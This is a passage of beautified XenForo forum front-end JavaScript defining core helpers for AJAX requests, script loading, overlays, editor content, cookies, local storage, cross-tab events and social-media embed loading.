    hideParentOverlay: function (a) {
      a = a.closest(".overlay-container");
      a.length && a.data("overlay") && a.data("overlay").hide();
    },
    getStickyHeaderOffset: function () {
      var a,
        b = 0;
      for (a = 0; a < XF.StickyHeader.cache.length; a++) {
        var c = XF.StickyHeader.cache[a];
        c.$target.hasClass(c.options.stickyClass) && (b += c.$target.outerHeight());
      }
      return b;
    },
    loadedScripts: {},
    loadScript: function (a, b) {
      if (XF.loadedScripts.hasOwnProperty(a)) return !1;
      XF.loadedScripts[a] = !0;
      return d.ajax({
        url: a,
        dataType: "script",
        cache: !0,
        global: !1,
        success: b
      });
    },
    loadScripts: function (a, b) {
      function c() {
        m--;
        0 === m && b && b();
      }
      function f() {
        for (var a; n[0] && "loaded" == n[0].readyState;) a = n.shift(), a.onreadystatechange = null, a.onerror = null, l.appendChild(a), c();
      }
      var e = k.scripts[0],
        g = "async" in e;
      e = e.readyState;
      var l = k.head,
        m = 0,
        n = [],
        h;
      for (h in a) if (a.hasOwnProperty(h)) {
        var r = a[h];
        XF.loadedScripts[r] || (XF.loadedScripts[r] = !0, m++, g ? function (a) {
          var b = d("<script>").prop({
            src: a,
            async: !1
          });
          b.on("load error", function (a) {
            b.off("load error");
            c();
          });
          l.appendChild(b[0]);
        }(r) : e ? function (a) {
          var b = k.createElement("script");
          n.push(b);
          b.onreadystatechange = f;
          b.onerror = function () {
            b.onreadystatechange = null;
            b.onerror = null;
            c();
          };
          b.src = a;
        }(r) : d.ajax({
          url: r,
          dataType: "script",
          cache: !0,
          global: !1
        }).always(c));
      }
      !m && b && b();
    },
    ajax: function (a, b, c, f, e) {
      "function" == typeof c && void 0 === f && (f = c, c = {});
      c = c || {};
      var g = !0,
        l = !0,
        m = !0;
      e && (e.skipDefault && (l = g = !1, delete e.skipDefault), e.skipDefaultSuccessError && (l = !1, delete e.skipDefaultSuccessError), e.skipDefaultSuccess && (g = !1, delete e.skipDefaultSuccess), e.skipError && (m = !1, delete e.skipError));
      var n = function (a, b, c) {
          d(k).trigger("ajax:before-success", [a, b, c]);
          l && XF.defaultAjaxSuccessError(a, b, c) || g && XF.defaultAjaxSuccess(a, b, c) || f && f(a, b, c);
        },
        x = function (a, b, c) {
          if (a.readyState) try {
            var g = d.parseJSON(a.responseText);
            n(g, "", a);
          } catch (B) {
            XF.defaultAjaxError(a, b, c);
          }
        };
      c = XF.dataPush(c, "_xfRequestUri", h.location.pathname + h.location.search);
      c = XF.dataPush(c, "_xfWithData", 1);
      XF.config.csrf && (c = XF.dataPush(c, "_xfToken", XF.config.csrf));
      var r = h.FormData && c instanceof FormData;
      a = d.extend(!0, {
        cache: !0,
        data: c || {},
        dataType: "json",
        beforeSend: function (a, b) {
          d(k).trigger("ajax:send", [a, b]);
        },
        error: m ? x : null,
        success: n,
        complete: function (a, b) {
          d(k).trigger("ajax:complete", [a, b]);
        },
        timeout: "get" === a ? 3E4 : 6E4,
        type: a,
        url: b,
        processData: r ? !1 : !0
      }, e);
      r && (a.contentType = !1);
      switch (a.dataType) {
        case "html":
        case "json":
        case "xml":
          a.data = XF.dataPush(a.data, "_xfResponseType", a.dataType);
      }
      "json" != a.dataType && (g = !1);
      return d.ajax(a);
    },
    dataPush: function (a, b, c) {
      a && "string" != typeof a ? void 0 !== a[0] ? a.push({
        name: b,
        value: c
      }) : h.FormData && a instanceof FormData ? a.append(b, c) : a[b] = c : (a = String(a), a += "&" + encodeURIComponent(b) + "=" + encodeURIComponent(c));
      return a;
    },
    defaultAjaxSuccessError: function (a, b, c) {
      if ("object" != typeof a) return XF.alert("Response was not JSON."), !0;
      a.html && a.html.templateErrors && (b = "Errors were triggered when rendering this template:", a.html.templateErrorDetails && (b += "\n* " + a.html.templateErrorDetails.join("\n* ")), console.error(b));
      return a.errorHtml ? (XF.setupHtmlInsert(a.errorHtml, function (a, b) {
        b = b.h1 || b.title || XF.phrase("oops_we_ran_into_some_problems");
        XF.overlayMessage(b, a);
      }), !0) : a.errors ? (XF.alert(a.errors), !0) : a.exception ? (XF.alert(a.exception), !0) : !1;
    },
    defaultAjaxSuccess: function (a, b, c) {
      a && "ok" == a.status && a.message && XF.flashMessage(a.message, 3E3);
      return !1;
    },
    defaultAjaxError: function (a, b, c) {
      switch (b) {
        case "abort":
          return;
        case "timeout":
          XF.alert(XF.phrase("server_did_not_respond_in_time_try_again"));
          return;
        case "notmodified":
        case "error":
          if (!a || !a.responseText) return;
      }
      console.error("PHP: " + a.responseText);
      XF.alert(XF.phrase("oops_we_ran_into_some_problems_more_details_console"));
    },
    activate: function (a) {
      XF.addExtraPhrases(a);
      XF.IgnoreWatcher.refresh(a);
      XF.Element.initialize(a);
      XF.DynamicDate.refresh(a);
      XF.ExpandableContent.checkSizing(a);
      XF.UnfurlLoader.activateContainer(a);
      XF.KeyboardShortcuts.initializeElements(a);
      XF.FormInputValidation.initializeElements(a);
      var b = a instanceof d ? a.get(0) : a;
      h.FB && setTimeout(function () {
        FB.XFBML.parse(b);
      }, 0);
      d(k).trigger("xf:reinit", [a]);
    },
    getDefaultFormData: function (a, b, c, f) {
      var e;
      b && b.length && b.attr("name") && (e = b.attr("name"));
      c && "multipart/form-data" === a.attr("enctype") && console.error("JSON serialized forms do not support the file upload-style enctype.");
      if (h.FormData && !c) {
        var g = new FormData(a[0]);
        e && g.append(e, b.attr("value"));
        a.find('input[type="file"]').each(function () {
          var a = d(this);
          if (0 === a.prop("files").length) try {
            g.delete(a.attr("name"));
          } catch (p) {}
        });
      } else {
        if (c) {
          a = a.is("form") ? d(a[0].elements) : a;
          var l,
            m = [],
            n = [];
          if (f) {
            "string" === typeof f && (f = f.split(","));
            var k = [];
            d.each(f, function (a, b) {
              "number" === typeof a ? k.push(XF.regexQuote(d.trim(b))) : k.push(XF.regexQuote(d.trim(a)));
            });
            k.length && (l = new RegExp("^(" + k.join("|") + ")(\\[|$)"));
          }
          a.each(function (a, b) {
            (a = b.name) && "_xf" !== a.substring(0, 3) ? !l || l.test(a) ? m.push(b) : n.push(b) : n.push(b);
          });
          g = d(n).serializeArray();
          f = d(m).serializeJSON();
          g.unshift({
            name: c,
            value: JSON.stringify(f)
          });
        } else g = a.serializeArray();
        e && g.push({
          name: e,
          value: b.attr("value")
        });
      }
      return g;
    },
    scriptMatchRegex: /<script([^>]*)>([\s\S]*?)<\/script>/ig,
    setupHtmlInsert: function (a, b, c) {
      if ("string" === typeof a || a instanceof d) a = {
        content: a
      };
      if ("object" == typeof a && a.content) {
        var f = arguments;
        XF.Loader.load(a.js, a.css, function () {
          var c,
            g = a.jsInline || [],
            l = a.content,
            m = "string" == typeof l,
            n = f[2] ? !0 : !1;
          if (a.cssInline) for (c = 0; c < a.cssInline.length; c++) d("<style>" + a.cssInline[c] + "</style>").appendTo("head");
          if (m) {
            var h;
            l = d.trim(l);
            if (!n) for (; c = XF.scriptMatchRegex.exec(l);) {
              var k = !1;
              if (h = c[1].match(/(^|\s)type=("|'|)([^"' ;]+)/)) switch (h[3].toLowerCase()) {
                case "text/javascript":
                case "text/ecmascript":
                case "application/javascript":
                case "application/ecmascript":
                  k = !0;
              } else k = !0;
              k && (g.push(c[2]), l = l.replace(c[0], ""));
            }
            l = l.replace(/<noscript>([\s\S]*?)<\/noscript>/ig, "");
          }
          var p = d(m ? d.parseHTML(l, null, n) : l);
          p.retinaFix();
          p.find("noscript").empty().remove();
          if (b instanceof d) {
            var v = b;
            b = function (a) {
              v.html(a);
            };
          }
          if ("function" !== typeof b) console.error("onReady was not a function");else {
            var t = !1;
            l = function (b) {
              if (!t) {
                t = !0;
                for (var c = 0; c < g.length; c++) d.globalEval(g[c]);
                a.jsState && (XF.config.jsState = XF.applyJsState(XF.config.jsState, a.jsState));
                b || XF.activate(p);
              }
            };
            !1 !== b(p, a, l) && l();
          }
        });
      } else console.error("Was not provided an object or HTML content");
    },
    alert: function (a, b, c, f) {
      var e = a;
      "object" == typeof a && (e = "<ul>", d.each(a, function (a, b) {
        e += "<li>" + b + "</li>";
      }), e += "</ul>", e = '<div class="blockMessage">' + e + "</div>");
      b || (b = "error");
      if (!c) switch (b) {
        case "error":
          c = XF.phrase("oops_we_ran_into_some_problems");
          break;
        default:
          c = "";
      }
      return XF.overlayMessage(c, e);
    },
    getOverlayHtml: function (a) {
      var b = {
        dismissible: !0,
        title: null
      };
      d.isPlainObject(a) && (b = d.extend({}, b, a), a.html && (a = a.html));
      if ("string" == typeof a) a = d(d.parseHTML(a));else if (!(a instanceof d)) throw Error("Can only create an overlay with html provided as a string or jQuery object");
      if (!a.is(".overlay")) {
        var c = b.title;
        if (!c) {
          var f = a.find(".overlay-title");
          f.length && (c = f.contents(), f.remove());
        }
        c || (c = XF.htmlspecialchars(d("title").text()));
        f = a.find(".overlay-content");
        f.length && (a = f);
        f = d('<div class="overlay" tabindex="-1"><div class="overlay-title"></div><div class="overlay-content"></div></div>');
        var e = f.find(".overlay-title");
        e.html(c);
        b.dismissible && e.prepend('<a class="overlay-titleCloser js-overlayClose" role="button" tabindex="0" aria-label="' + XF.phrase("close") + '"></a>');
        f.find(".overlay-content").html(a);
        a = f;
      }
      a.appendTo("body");
      return a;
    },
    createMultiBar: function (a, b, c, d) {},
    getMultiBarHtml: function (a) {
      var b = {
        dismissible: !0,
        title: null
      };
      d.isPlainObject(a) && (d.extend({}, b, a), a.html && (a = a.html));
      if ("string" == typeof a) a = d(d.parseHTML(a));else if (!(a instanceof d)) throw Error("Can only create an action bar with html provided as a string or jQuery object");
      b = d('<div class="multiBar" tabindex="-1"><div class="multiBar-inner"><span>Hello there.</span></div></div>');
      b.find(".multiBar-inner").html(a);
      b.appendTo("body");
      return b;
    },
    overlayMessage: function (a, b) {
      if ("string" == typeof b) b = d(d.parseHTML(b));else if (!(b instanceof d)) throw Error("Can only create an overlay with html provided as a string or jQuery object");
      b.is(".block, .blockMessage") || b.find(".block, .blockMessage").length || (b = d('<div class="blockMessage" />').html(b));
      b = XF.getOverlayHtml({
        title: a,
        html: b
      });
      return XF.showOverlay(b, {
        role: "alertdialog"
      });
    },
    flashMessage: function (a, b, c) {
      var f = d('<div class="flashMessage"><div class="flashMessage-content"></div></div>');
      f.find(".flashMessage-content").html(a);
      f.appendTo("body").addClassTransitioned("is-active");
      setTimeout(function () {
        f.removeClassTransitioned("is-active", function () {
          f.remove();
          c && c();
        });
      }, Math.max(500, b));
    },
    htmlspecialchars: function (a) {
      return String(a).replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    },
    regexQuote: function (a) {
      return (a + "").replace(/([\\\.\+\*\?\[\^\]\$\(\)\{\}=!<>\|:])/g, "\\$1");
    },
    stringTranslate: function (a, b) {
      a = a.toString();
      for (var c in b) if (b.hasOwnProperty(c)) {
        var d = new RegExp(XF.regexQuote(c, "g"));
        a = a.replace(d, b[c]);
      }
      return a;
    },
    stringHashCode: function (a) {
      var b = 0,
        c;
      if (0 === a.length) return b;
      var d = 0;
      for (c = a.length; d < c; d++) {
        var e = a.charCodeAt(d);
        b = (b << 5) - b + e;
        b |= 0;
      }
      return b;
    },
    getUniqueCounter: function () {
      var a = XF.counter;
      XF.counter++;
      return a;
    },
    canonicalizeUrl: function (a) {
      if (a.match(/^[a-z]+:/i)) return a;
      if (0 == a.indexOf("/")) {
        var b;
        return (b = XF.config.url.fullBase.match(/^([a-z]+:(\/\/)?[^\/]+)\//i)) ? b[1] + a : a;
      }
      return XF.config.url.fullBase + a;
    },
    isRedirecting: !1,
    redirect: function (a) {
      XF.isRedirecting = !0;
      if (XF.JobRunner.isBlockingJobRunning()) return d(k).one("job:blocking-complete", function () {
        XF.redirect(a);
      }), !1;
      a = XF.canonicalizeUrl(a);
      var b = h.location;
      if (a == b.href) b.reload(!0);else {
        h.location = a;
        var c = a.split("#"),
          f = b.href.split("#");
        c[1] && c[0] == f[0] && b.reload(!0);
      }
      return !0;
    },
    getAutoCompleteUrl: function () {
      return "admin" == XF.getApp() ? XF.canonicalizeUrl("admin.php?users/find") : XF.canonicalizeUrl("index.php?members/find");
    },
    applyDataOptions: function (a, b, c) {
      var f = {},
        e;
      for (e in a) if (a.hasOwnProperty(e) && (f[e] = a[e], b.hasOwnProperty(e))) {
        var g = b[e];
        var l = typeof g;
        var m = !0;
        switch (typeof f[e]) {
          case "string":
            "string" != l && (g = String(g));
            break;
          case "number":
            "number" != l && (g = Number(g), isNaN(g) && (m = !1));
            break;
          case "boolean":
            if ("boolean" != l) switch (g) {
              case "true":
              case "yes":
              case "on":
              case "1":
              case 1:
                g = !0;
                break;
              default:
                g = !1;
            }
        }
        m && (f[e] = g);
      }
      d.isPlainObject(c) && (f = d.extend(f, c));
      return f;
    },
    watchInputChangeDelayed: function (a, b, c) {
      var f = d(a),
        e = f.val(),
        g;
      c = c || 200;
      f.onPassive({
        keyup: function () {
          clearTimeout(g);
          g = setTimeout(function () {
            var a = f.val();
            a != e && (e = a, b());
          }, c);
        },
        paste: function () {
          setTimeout(function () {
            f.trigger("keyup");
          }, 0);
        }
      });
    },
    insertIntoEditor: function (a, b, c, d) {
      return XF.modifyEditorContent(a, function (a) {
        a.insertContent(b);
      }, function (a) {
        XF.insertIntoTextBox(a, c);
      }, d);
    },
    replaceEditorContent: function (a, b, c, d) {
      return XF.modifyEditorContent(a, function (a) {
        a.replaceContent(b);
      }, function (a) {
        XF.replaceIntoTextBox(a, c);
      }, d);
    },
    clearEditorContent: function (a, b) {
      b = XF.replaceEditorContent(a, "", "", b);
      a.trigger("draft:sync");
      return b;
    },
    modifyEditorContent: function (a, b, c, f) {
      a = XF.getEditorInContainer(a, f);
      return a ? XF.Editor && a instanceof XF.Editor ? (a.isBbCodeView() ? (b = a.ed.bbCode.getTextArea(), c(b), b.trigger("autosize")) : b(a), !0) : a instanceof d && a.is("textarea") ? (c(a), a.trigger("autosize"), !0) : !1 : !1;
    },
    getEditorInContainer: function (a, b) {
      if (a.is(".js-editor")) {
        if (b && a.is(b)) return null;
        b = a;
      } else {
        a = a.find(".js-editor");
        b && (a = a.not(b));
        if (!a.length) return null;
        b = a.first();
      }
      return (a = XF.Element.getHandler(b, "editor")) ? a : b.is("textarea") ? b : null;
    },
    focusEditor: function (a, b) {
      a = XF.getEditorInContainer(a, b);
      return a ? XF.Editor && a instanceof XF.Editor ? (a.isInitialized() && a.scrollToCursor(), !0) : a instanceof d && a.is("textarea") ? (a.autofocus(), !0) : !1 : !1;
    },
    insertIntoTextBox: function (a, b) {
      var c = a[0],
        d = c.scrollTop,
        e = c.selectionStart,
        g = c.selectionEnd,
        l = a.val(),
        m = l.substring(0, e);
      g = l.substring(g, l.length);
      a.val(m + b + g).trigger("autosize");
      c.selectionStart = c.selectionEnd = e + b.length;
      c.scrollTop = d;
      a.autofocus();
    },
    replaceIntoTextBox: function (a, b) {
      a.val(b).trigger("autosize");
    },
    isElementWithinDraftForm: function (a) {
      a = a.is("form") ? a : a.closest("form");
      return a.length && a.is("[data-xf-init~=draft]");
    },
    logRecentEmojiUsage: function (a) {
      a = d.trim(a);
      var b = XF.Feature.has("hiddenscroll") ? 12 : 11,
        c = XF.Cookie.get("emoji_usage");
      c = c ? c.split(",") : [];
      var f = c.indexOf(a);
      -1 !== f && c.splice(f, 1);
      c.push(a);
      c.length > b && (c = c.reverse().slice(0, b).reverse());
      XF.Cookie.set("emoji_usage", c.join(","), new Date(new Date().setFullYear(new Date().getFullYear() + 1)));
      d(k).trigger("recent-emoji:logged");
      return c;
    },
    getRecentEmojiUsage: function () {
      var a = XF.Cookie.get("emoji_usage");
      return (a ? a.split(",") : []).reverse();
    },
    getFixedOffsetParent: function (a) {
      do {
        if ("fixed" == a.css("position")) return a;
        a = a.parent();
      } while (a[0] && 1 === a[0].nodeType);
      return d(k.documentElement);
    },
    getFixedOffset: function (a) {
      var b = a.offset(),
        c = XF.getFixedOffsetParent(a);
      if (a.is("html")) return b;
      a = c.offset();
      return {
        top: b.top - a.top,
        left: b.left - a.left
      };
    },
    autoFocusWithin: function (a, b, c) {
      var f = a.find(b || "[autofocus]");
      f.length || (!f.length && XF.NavDeviceWatcher.isKeyboardNav() && (f = a.find("a, button, :input, [tabindex]").filter(":visible").not(":disabled, [data-no-auto-focus]").first()), f.length || (b = a.is("form:not([data-no-auto-focus])") ? a : a.find("form:not([data-no-auto-focus])").first(), b.length && (f = b.find(":input, button").filter(":visible").not(":disabled, .select2-hidden-accessible").first())), !f.length && c && c.length && (f = c), f.length || (a.attr("tabindex", "-1"), f = a));
      f = f.first();
      a = [];
      c = f[0].parentNode;
      do a.push({
        el: c,
        left: c.scrollLeft,
        top: c.scrollTop
      }); while (c = c.parentNode);
      f.on("focus", function () {
        d(h).on("resize", function () {
          setTimeout(function () {
            XF.isElementVisible(f) || (f.get(0).scrollIntoView({
              behavior: "smooth",
              block: "end",
              inline: "nearest"
            }), d(h).off("resize"));
          }, 50);
        });
      });
      f.first().autofocus();
      for (b = 0; b < a.length; b++) c = a[b].el, c.scrollLeft != a[b].left && (c.scrollLeft = a[b].left), c.scrollTop != a[b].top && (c.scrollTop = a[b].top);
    },
    bottomFix: function (a) {
      var b = d(".js-bottomFixTarget").first();
      b ? b.append(a) : d(a).css({
        position: "fixed",
        bottom: 0
      }).appendTo("body");
    },
    addFixedMessage: function (a, b) {
      var c = d(d.parseHTML('<div class="fixedMessageBar"><div class="fixedMessageBar-inner"><div class="fixedMessageBar-message"></div><a class="fixedMessageBar-close" data-close="true" role="button" tabindex="0" aria-label="' + XF.phrase("close") + '"></a></div></div>'));
      c.find(".fixedMessageBar-message").html(a);
      b && (b.class && (c.addClass(b.class), delete b.class), c.attr(b));
      c.on("click", "[data-close]", function () {
        c.removeClassTransitioned("is-active", function () {
          c.remove();
        });
      });
      XF.bottomFix(c);
      c.addClassTransitioned("is-active");
    },
    _measureScrollBar: null,
    measureScrollBar: function (a, b) {
      b = "height" == b || "h" == b ? "h" : "w";
      if (a || null === XF._measureScrollBar) {
        var c = d('<div class="scrollMeasure" />');
        c.appendTo(a || "body");
        var f = c[0];
        f = {
          w: f.offsetWidth - f.clientWidth,
          h: f.offsetHeight - f.clientHeight
        };
        c.remove();
        a || (XF._measureScrollBar = f);
        return f[b];
      }
      return XF._measureScrollBar[b];
    },
    windowHeight: function () {
      return XF.browser.ios || XF.browser.android ? h.innerHeight : d(h).height();
    },
    pageLoadScrollFix: function () {
      if (h.location.hash) {
        var a = !1,
          b = function () {
            if (!a) {
              var b = h.location.hash.replace(/[^a-zA-Z0-9_-]/g, "");
              b = b ? d("#" + b) : d();
              b.length && b.get(0).scrollIntoView(!0);
            }
          };
        "complete" == k.readyState ? setTimeout(b, 0) : (setTimeout(function () {
          d(h).one("scroll", function (b) {
            a = !0;
          });
        }, 100), d(h).one("load", b));
      }
    },
    applyJsState: function (a, b) {
      a = a || {};
      if (!b) return a;
      for (var c in b) b.hasOwnProperty(c) && !a[c] && XF.jsStates.hasOwnProperty(c) && XF.jsStates[c]() && (a[c] = !0);
      return a;
    },
    jsStates: {
      facebook: function () {
        return this.fbSdk();
      },
      fbSdk: function () {
        d(k.body).append(d('<div id="fb-root" />'));
        h.fbAsyncInit = function () {
          FB.init({
            version: "v2.7",
            xfbml: !0
          });
        };
        XF.loadScript("https://connect.facebook.net/" + XF.getLocale() + "/sdk.js");
        return !0;
      },
      twitter: function () {
        h.twttr = function () {
          var a = h.twttr || {};
          XF.loadScript("https://platform.twitter.com/widgets.js") && (a._e = [], a.ready = function (b) {
            a._e.push(b);
          });
          return a;
        }();
        return !0;
      },
      flickr: function () {
        XF.loadScript("https://embedr.flickr.com/assets/client-code.js");
        return !0;
      },
      instagram: function () {
        XF.loadScript("https://platform.instagram.com/" + XF.getLocale() + "/embeds.js", function () {
          d(k).on("xf:reinit", function (a, b) {
            h.instgrm && instgrm.Embeds.process(b instanceof d ? b.get(0) : b);
          });
        });
      },
      reddit: function () {
        XF.loadScript("https://embed.redditmedia.com/widgets/platform.js");
        XF.loadScript("https://www.redditstatic.com/comment-embed.js", function () {
          d(k).on("xf:reinit", function (a, b) {
            h.rembeddit && rembeddit.init();
          });
        });
        return !0;
      },
      reddit_comment: function () {
        return this.reddit();
      },
      imgur: function () {
        h.imgurEmbed || (h.imgurEmbed = {
          tasks: d("blockquote.imgur-embed-pub").length
        });
        XF.loadScript("//s.imgur.com/min/embed-controller.js", function () {
          d(k).on("xf:reinit", function (a, b) {
            imgurEmbed.tasks += d("blockquote.imgur-embed-pub").length;
            for (a = 0; a < imgurEmbed.tasks; a++) imgurEmbed.createIframe(), imgurEmbed.tasks--;
          });
        });
        return !0;
      },
      pinterest: function () {
        XF.loadScript("//assets.pinterest.com/js/pinit.js", function () {
          d(k).on("xf:reinit", function (a, b) {
            PinUtils.build(b instanceof d ? b.get(0) : b);
          });
        });
        return !0;
      }
    },
    getLocale: function () {
      var a = d("html").attr("lang").replace("-", "_");
      a || (a = "en_US");
      return a;
    },
    supportsPointerEvents: function () {
      return "PointerEvent" in h;
    },
    isEventTouchTriggered: function (a) {
      if (a) {
        if (a.xfPointerType) return "touch" === a.xfPointerType;
        if (a = a.originalEvent) {
          if (XF.supportsPointerEvents() && a instanceof PointerEvent) return "touch" === a.pointerType;
          if (a.sourceCapabilities) return a.sourceCapabilities.firesTouchEvents;
        }
      }
      return XF.Feature.has("touchevents");
    },
    getElEffectiveZIndex: function (a) {
      var b = parseInt(a.css("z-index"), 10) || 0;
      a.parents().each(function (a, f) {
        a = parseInt(d(f).css("z-index"), 10);
        a > b && (b = a);
      });
      return b;
    },
    setRelativeZIndex: function (a, b, c, f) {
      f || (f = 6);
      var e = XF.getElEffectiveZIndex(b);
      f && f > e && (e = f);
      if (null === c || "undefined" === typeof c) c = 0;
      e || c ? a.each(function () {
        var a = d(this);
        "undefined" == typeof a.data("base-z-index") && a.data("base-z-index", parseInt(a.css("z-index"), 10) || 0);
        a.css("z-index", a.data("base-z-index") + c + e);
      }) : a.css("z-index", "");
    },
    adjustHtmlForRte: function (a) {
      a = a.replace(/<img[^>]+>/ig, function (a) {
        if (a.match(/class="([^"]* )?smilie( |")/)) {
          var b;
          if (b = a.match(/alt="([^"]+)"/)) return b[1];
        }
        return a;
      });
      a = a.replace(/([\w\W]|^)<a\s[^>]*data-user-id="\d+"\s+data-username="([^"]+)"[^>]*>([\w\W]+?)<\/a>/gi, function (a, c, d, e) {
        return c + ("@" == c ? "" : "@") + e.replace(/^@/, "");
      });
      return a = a.replace(/(<img\s[^>]*)src="[^"]*"(\s[^>]*)data-url="([^"]+)"/gi, function (a, c, d, e) {
        return c + 'src="' + e + '"' + d;
      });
    },
    requestAnimationTimeout: function (a, b) {
      function c() {
        Date.now() - e >= b ? a() : g.id = d(c);
      }
      b || (b = 0);
      var d = h.requestAnimationFrame || function (a) {
          return h.setTimeout(a, 1E3 / 60);
        },
        e = Date.now(),
        g = {};
      g.id = d(c);
      g.cancel = function () {
        (h.cancelAnimationFrame || h.clearTimeout)(this.id);
      };
      return g;
    },
    proxy: function (a, b) {
      var c;
      if ("string" === typeof b) {
        var d = a[b];
        b = a;
        a = d;
      }
      if ("function" === typeof a) return (c = [].slice.call(arguments, 2)) ? function () {
        return a.apply(b, c.concat([].slice.call(arguments)));
      } : a.bind(b, c);
    },
    _localLoadTime: null,
    getLocalLoadTime: function () {
      if (XF._localLoadTime) return XF._localLoadTime;
      var a = XF.config.time,
        b = d("#_xfClientLoadTime"),
        c = b.val();
      if (c && c.length) {
        var f = c.split(",");
        if (2 == f.length && parseInt(f[1], 10) == a.now) {
          var e = parseInt(f[0], 10);
          b.val(c);
        }
      }
      e || (h.performance && h.performance.timing && 0 !== h.performance.timing.requestStart ? (e = h.performance.timing, e = Math.floor((e.requestStart + e.responseStart) / 2E3)) : e = Math.floor(new Date().getTime() / 1E3) - 1, b.val(e + "," + a.now));
      return XF._localLoadTime = e;
    },
    getFutureDate: function (a, b) {
      var c = 864E5;
      switch (b) {
        case "year":
          c *= 365;
          break;
        case "month":
          c *= 30;
      }
      c *= a;
      return new Date(Date.now() + c);
    },
    smoothScroll: function (a, b, c, f) {
      if ("undefined" === typeof c || null === c) c = XF.config.speed.fast;
      if (a instanceof d || "string" === typeof a) {
        var e = a instanceof d ? a : d(a);
        if (e.length) {
          var g = e.offset().top;
          a = parseInt(d("html").css("scroll-padding-top"), 10);
          isNaN(a) || (g -= a);
        } else g = null;
        !0 === b && (b = e.length ? "#" + e.attr("id") : null);
      } else "number" === typeof a && (e = null, g = a);
      if (null === g) console.error("Invalid scroll position");else {
        0 > g && (g = 0);
        e = function () {
          b && "pushState" in h.history && h.history.pushState({}, "", h.location.toString().replace(/#.*$/, "") + b);
        };
        if (f && (f = d(h).scrollTop(), a = f + d(h).height(), g >= f && g <= a)) {
          e();
          return;
        }
        try {
          e(), d("html, body").animate({
            scrollTop: g
          }, c, function () {
            b && !h.history.pushState && (h.location.hash = b);
          });
        } catch (l) {
          b && (h.location.hash = b);
        }
      }
    }
  }), "function" != typeof Object.create && (Object.create = function () {
    var a = function () {};
    return function (b) {
      a.prototype = b;
      b = new a();
      a.prototype = null;
      return b;
    };
  }()), XF.create = function (a) {
    var b = function () {
      this.__construct.apply(this, arguments);
    };
    b.prototype = Object.create(a);
    b.prototype.__construct || (b.prototype.__construct = function () {});
    return b.prototype.constructor = b;
  }, XF.extend = function (a, b) {
    var c = function () {
        this.__construct.apply(this, arguments);
      },
      d;
    c.prototype = Object.create(a.prototype);
    c.prototype.__construct || (c.prototype.__construct = function () {});
    c.prototype.constructor = c;
    if ("object" == typeof b) {
      if ("object" == typeof b.__backup) {
        a = b.__backup;
        for (d in a) if (a.hasOwnProperty(d)) {
          if (c.prototype[a[d]]) throw Error("Method " + a[d] + " already exists on object. Aliases must be unique.");
          c.prototype[a[d]] = c.prototype[d];
        }
        delete b.__backup;
      }
      for (d in b) b.hasOwnProperty(d) && (c.prototype[d] = b[d]);
    }
    return c;
  }, XF.classToConstructor = function (a) {
    var b = h,
      c = a.split("."),
      d;
    for (d = 0; d < c.length; d++) b = b[c[d]];
    return "function" != typeof b ? (console.error("%s is not a function.", a), !1) : b;
  }, XF.Cookie = {
    get: function (a) {
      return (a = new RegExp("(^| )" + XF.config.cookie.prefix + a + "=([^;]+)(;|$)").exec(k.cookie)) ? decodeURIComponent(a[2]) : null;
    },
    set: function (a, b, c, d) {
      var e = XF.config.cookie;
      k.cookie = e.prefix + a + "=" + encodeURIComponent(b) + (void 0 === c ? "" : ";expires=" + c.toUTCString()) + (e.path ? ";path=" + e.path : "") + (e.domain ? ";domain=" + e.domain : "") + (d ? ";samesite=" + d : "") + (e.secure ? ";secure" : "");
    },
    getJson: function (a) {
      a = this.get(a);
      if (!a) return {};
      try {
        return d.parseJSON(a) || {};
      } catch (b) {
        return {};
      }
    },
    setJson: function (a, b, c) {
      this.set(a, JSON.stringify(b), c);
    },
    remove: function (a) {
      var b = XF.config.cookie;
      k.cookie = b.prefix + a + "=" + (b.path ? "; path=" + b.path : "") + (b.domain ? "; domain=" + b.domain : "") + (b.secure ? "; secure" : "") + "; expires=Thu, 01-Jan-70 00:00:01 GMT";
    },
    supportsExpiryDate: function () {
      return !0;
    }
  }, XF.LocalStorage = {
    getKeyName: function (a) {
      return XF.config.cookie.prefix + a;
    },
    get: function (a) {
      var b = null;
      try {
        b = h.localStorage.getItem(this.getKeyName(a));
      } catch (f) {}
      if (null === b) {
        var c = this.getFallbackValue();
        c && c.hasOwnProperty(a) && (b = c[a]);
      }
      return b;
    },
    getJson: function (a) {
      a = this.get(a);
      if (!a) return {};
      try {
        return d.parseJSON(a) || {};
      } catch (b) {
        return {};
      }
    },
    set: function (a, b, c) {
      try {
        h.localStorage.setItem(this.getKeyName(a), b);
      } catch (f) {
        c && (c = this.getFallbackValue(), c[a] = b, this.updateFallbackValue(c));
      }
    },
    setJson: function (a, b, c) {
      this.set(a, JSON.stringify(b), c);
    },
    remove: function (a) {
      try {
        h.localStorage.removeItem(this.getKeyName(a));
      } catch (c) {}
      var b = this.getFallbackValue();
      b && b.hasOwnProperty(a) && (delete b[a], this.updateFallbackValue(b));
    },
    getFallbackValue: function () {
      var a = XF.Cookie.get("ls");
      if (a) try {
        a = d.parseJSON(a);
      } catch (b) {
        a = {};
      }
      return a || {};
    },
    updateFallbackValue: function (a) {
      d.isEmptyObject(a) ? XF.Cookie.remove("ls") : XF.Cookie.set("ls", JSON.stringify(a));
    },
    supportsExpiryDate: function () {
      return !1;
    }
  }, XF.CrossTab = function () {
    function a(a) {
      var c = XF.LocalStorage.getKeyName("__crossTab");
      if (a.key === c) {
        try {
          var e = d.parseJSON(a.newValue);
        } catch (m) {
          return;
        }
        if (e && e.event && (a = e.event, e = e.data || null, c = b[a])) {
          f = a;
          for (a = 0; a < c.length; a++) c[a](e);
          f = null;
        }
      }
    }
    var b = {},
      c = !1,
      f;
    return {
      on: function (d, g) {
        b[d] || (b[d] = []);
        b[d].push(g);
        c || (c = !0, h.addEventListener("storage", a));
      },
      trigger: function (a, b, c) {
        !c && f && f == a || XF.LocalStorage.setJson("__crossTab", {
          event: a,
          data: b,
          _: new Date() + Math.random()
        });
      }
    };
  }(), XF.Breakpoint = function () {
    function a(a) {
      for (var b = 0; b < e.length && a != e[b]; b++) if (f == e[b]) return !0;
      return !1;
    }
    function b(a) {
      for (var b = !1, c = 0; c < e.length; c++) if (a == e[c]) b = !0;else if (f == e[c]) return b;
      return !1;
    }
    function c() {
      var a = h.getComputedStyle(d("html")[0], ":after").getPropertyValue("content").replace(/"/g, "");
      if (f) {
        if (a != f) {
          var b = f;
          f = a;
          d(k).trigger("breakpoint:change", [b, a]);
        }
      } else f = a;
      return f;
    }
    var f = null,
